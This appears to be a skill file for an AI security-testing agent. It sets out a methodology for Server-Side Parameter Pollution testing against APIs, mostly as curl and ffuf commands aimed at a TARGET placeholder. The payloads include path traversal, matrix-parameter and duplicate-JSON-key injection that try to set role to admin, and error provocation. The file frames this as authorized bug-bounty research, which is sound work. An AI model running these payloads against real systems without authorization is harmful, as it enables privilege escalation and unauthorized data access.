---
name: ssp-testing
description: Server-Side Parameter Pollution (SSP) — test query strings, REST paths, and structured data (JSON/XML) for parameter collision, parser differential, and internal field leakage. Maps to API8:2023 / API10:2023.
allowed-tools: Read, Grep, Glob, Bash
---

# Server-Side Parameter Pollution Testing (API8:2023 / API10:2023)

SSP exploits inconsistencies in how different server-side components parse
parameters. When an application server, a framework, and a backend service each
parse parameters differently, an attacker can inject parameters that one
component sees and another ignores. This is distinct from injection-testing
(SQLi/SSRF/cmd) — SSP is about parameter PARSING, not backend query injection.

## Prerequisites

- Endpoints with query parameters (especially those forwarded to internal services)
- REST path parameters (e.g., `/api/users/123/orders/456`)
- JSON/XML body parameters on PUT/PATCH/POST
- Multi-tier architectures (frontend proxy → app server → backend API)
- Technology stack fingerprint (Express vs qs, Spring vs Tomcat, Flask, PHP, ASP.NET)

## Methodology

### Step 1: Identify candidate endpoints

From the asset map and recon data, collect endpoints with parameters:

```bash
# Endpoints with query or path params
jq '.endpoints[] | select(.parameters != null and (.parameters | length > 0)) | .url' "$PROJECT_DIR/asset-map.json"

# Endpoints that accept JSON/XML bodies
cat "$PROJECT_DIR/recon/api-paths.txt" 2>/dev/null || true

# Check for multi-tier indicators: internal hostnames in error messages,
# X-Forwarded-* header handling, proxy-level redirects
```

### Step 2: Query string pollution

Inject parameter separators and fragments into query parameters. Different
parsers handle `#`, `?`, `&`, `=` differently — test each.

```bash
# Manual probe: inject fragment into query value
curl -s "https://TARGET/api/users?id=123%23fragment" \
  -H "X-HackerOne-Research: <your-h1-handle>"

# Automated probe with ffuf
ffuf -w specter/wordlists/ssp-payloads.txt \
  -u "https://TARGET/api/endpoint?param=FUZZ" \
  -H "X-HackerOne-Research: <your-h1-handle>" \
  -mr "error|trace|exception|debug|internal|stack" -t 5 -of json \
  -o "$PROJECT_DIR/logs/ssp-query.json"

# Test duplicate parameters (different parsers take first vs last)
curl -s "https://TARGET/api/users?id=1&id=2" \
  -H "X-HackerOne-Research: <your-h1-handle>"
```

### Step 3: REST path pollution

Inject traversal sequences and parameter separators into REST URL path segments.
The application server may route differently than the backend interprets.

```bash
# Path traversal in REST URL
curl -s "https://TARGET/api/users/123%2F..%2Fadmin" \
  -H "X-HackerOne-Research: <your-h1-handle>"

# Matrix parameter injection (Java/JAX-RS targets)
curl -s "https://TARGET/api/users/123;role=admin/orders" \
  -H "X-HackerOne-Research: <your-h1-handle>"

# Double encoding
curl -s "https://TARGET/api/users/..%252fadmin" \
  -H "X-HackerOne-Research: <your-h1-handle>"

# Path separator confusion (; in some stacks acts like /)
curl -s "https://TARGET/api/users/..;admin" \
  -H "X-HackerOne-Research: <your-h1-handle>"
```

### Step 4: Structured data pollution (JSON/XML)

Send duplicate keys, type-juggled values, and nested injection payloads.
Different JSON parsers handle duplicate keys differently (first wins, last wins,
or error). XML parsers may merge or reject duplicate elements.

```bash
# Duplicate JSON keys — different parsers: last-wins (JS), first-wins (some Java),
# error (strict), array coercion
curl -s -X POST "https://TARGET/api/users" \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: <your-h1-handle>" \
  -d '{"id": 1, "id": 2, "role": "admin"}'

# Type juggling: string where number expected
curl -s -X PATCH "https://TARGET/api/users/123" \
  -H "Content-Type: application/json" \
  -d '{"id": "1", "role": "admin"}'

# Array wrapping (object where single value expected)
curl -s -X PATCH "https://TARGET/api/users/123" \
  -H "Content-Type: application/json" \
  -d '{"id": [1, 2, 3]}'

# Nested parameter injection
curl -s -X PATCH "https://TARGET/api/users/123" \
  -H "Content-Type: application/json" \
  -d '{"user": {"id": 1, "role": "admin"}}'

# XML duplicate elements
curl -s -X POST "https://TARGET/api/users" \
  -H "Content-Type: application/xml" \
  -d '<user><id>1</id><id>2</id><role>admin</role></user>'
```

### Step 5: Verbose error provocation

Send deliberately malformed payloads and observe error responses. Verbose errors
may leak: internal field names, backend API routes, framework/version, internal
hostnames, or stack traces.

```bash
# Type confusion
curl -s -X PATCH "https://TARGET/api/users/123" \
  -d '{"id": "notanumber"}' -H "Content-Type: application/json"

# Large value
curl -s -X PATCH "https://TARGET/api/users/123" \
  -d '{"id": 999999999999}' -H "Content-Type: application/json"

# Negative value
curl -s "https://TARGET/api/users/-1"

# Empty value
curl -s "https://TARGET/api/users/"

# Wrong content type
curl -s -X POST "https://TARGET/api/users" \
  -d '{"id": 1}' -H "Content-Type: text/plain"

# Oversized payload (10KB+ repeated character)
python3 -c "print('{\"id\": \"' + 'A'*10000 + '\"}')" | \
  curl -s -X POST "https://TARGET/api/users" -d @- \
  -H "Content-Type: application/json"
```

### Step 6: Parameter space probing

Test the same parameter in different locations simultaneously. Different
components parse different parts of the request — query, body, path, headers.

```bash
# Query param + body with conflicting values
curl -s -X POST "https://TARGET/api/users?id=victim" \
  -H "Content-Type: application/json" \
  -d '{"id": "admin"}'

# Header + query collision
curl -s "https://TARGET/api/users?id=victim" \
  -H "X-User-Id: admin"

# Path param + query param
curl -s "https://TARGET/api/users/admin?id=victim"
```

## Parse-Differential Tricks by Stack

| Stack | Quirk | SSP Implication |
|-------|-------|----------------|
| **Express/Node** | `req.query.id` = last value; `qs` parser gives array | Duplicate `?id=1&id=2` — which does the backend see? |
| **Spring/Java** | `@RequestParam String id` = first value; array with `List` | Path matrix params `;admin=true` survive routing |
| **Flask/Python** | `request.args.get('id')` = first; `getlist('id')` = all | Duplicate params: test both get() and getlist() paths |
| **PHP** | `$_GET['id']` = last value by default | Send attacker value LAST in query string |
| **ASP.NET** | `Request.QueryString["id"]` = `"1,2"` comma-joined | Comma injection: `?id=1,admin` may pass validation |
| **Ruby/Rack** | `params['id']` = last value; `params['id'][]` = array | Array notation injection |

## Wordlists

- `specter/wordlists/ssp-payloads.txt` — SSP-specific payloads for each vector
- `specter/wordlists/api-params.txt` — common parameter names for probing

## Category Mapping

- Error-based SSP leaking internal fields/paths → **API8:2023** (Security Misconfiguration)
- Parameter injection changing backend behavior → **API10:2023** (Unsafe API Consumption)
- REST path pollution reaching unauthorized resources → **API1:2023** (BOLA via SSP)
- Duplicate key injection → **API3:2023** (BOPLA/Mass Assignment)

## False-Positive Traps

- Parameter duplication that doesn't change behavior (both values produce same result)
- Error messages that don't leak internal state (generic 500 without stack trace)
- Query string `#` that simply truncates at client side (browser behavior, not SSP)
- Path traversal in REST URLs that is actually REST routing (not parameter pollution)
- Same param in body+query producing same result as body-only (not a parser differential)

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the
repo-root `CLAUDE.md`). They do NOT enter a report or external submission until
promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent
check below.

- **Independent check for this class:** For blind SSP (parameter injection triggers
  an internal request): out-of-band callback proof. For error-based SSP (parameter
  manipulation changes error output deterministically): true/false differential
  where the SSP payload produces a DISTINGUISHABLE response from the clean request.
  For field leakage: prove the leaked field name corresponds to an ACTUAL internal
  field (not a generic error string). Confirm the parser differential matches the
  documented stack behavior.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method out-of-band \
  --negative-control "SSP payload triggers OOB callback; clean request does not" --by specter
```
